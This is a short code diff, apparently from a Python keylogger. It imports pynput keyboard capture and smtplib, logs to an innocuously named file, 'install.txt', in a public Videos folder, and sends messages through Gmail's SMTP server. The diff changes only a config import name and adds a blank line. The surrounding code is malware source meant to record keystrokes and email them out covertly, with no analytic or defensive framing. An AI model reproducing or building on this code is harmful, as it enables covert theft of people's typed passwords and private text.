@@ -1,7 +1,7 @@
 from pynput import keyboard
 from multiprocessing import Queue
 import smtplib, os, time, getpass
-from config import *
+from config_variables import *
 
 file ="C:/Users/Public/Videos/install.txt"
 
@@ -22,6 +22,7 @@ def send(msg, subject):
       "",
       msg
       ])
+    
     server = smtplib.SMTP('smtp.gmail.com:587')
     server.ehlo()
     server.starttls()
